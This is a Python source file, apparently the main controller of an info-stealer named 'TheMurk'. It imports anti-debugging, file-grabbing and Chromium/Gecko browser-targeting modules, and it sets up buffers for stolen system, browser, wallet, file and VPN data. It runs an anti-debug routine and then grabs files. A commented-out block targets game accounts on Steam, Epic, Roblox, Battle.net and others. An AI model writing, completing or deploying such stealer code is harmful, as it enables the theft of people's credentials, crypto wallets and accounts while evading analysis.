from preferences.config import *
from manager.antiDebug import AntiDebug
from manager.folders import Folders
from targets.files.files import TxtFiles
from targets.files.file_grabber import Grab
from targets.browsers.chromium import Chromium
from targets.browsers.geckodriver import GeckoDriver

class TheMurk:
    def __init__(self) -> None:
        self.MainVars()
        self.Progress()
    
    def MainVars(self):
        self.name = ''
        self.password = ''
        self.np = []
        self.msgSys = ""
        self.msgBrowsers =[]
        self.msgOther =[]
        self.msgWallets =[]
        self.msgFiles = []
        self.msgVPN = []
    
    def Progress(self):
        self.Start()
        self.GrabFiles()

    def Start(self):
        if not config.debuging:
            AntiDebug(config.oneStart)
        Folders(config.enableFileGrabber)
    
    def GrabFiles(self):
        if config.enableFileGrabber:
            self.msgFiles = Grab(self.msgFiles)
        else:
            TxtFiles()
    
    def Browsers(self):
        config.msgBrowsers = Chromium()
        config.msgBrowsers = GeckoDriver(config.msgBrowsers)


''' def Games():
        config.msgOther.append("\n\n**🕹Games🕹**")
        config.msgOther = epicGames.Epic(config.msgOther)
        config.msgOther = Uplay.Ubisoft(config.msgOther)
        config.msgOther = Minecraft.Minecraft(config.msgOther)
        config.msgOther = roblox.roblox(config.msgOther)
        config.msgOther = steam.Steam(config.msgOther)
        config.msgOther =BattleNET.BattleNet(config.msgOther)'''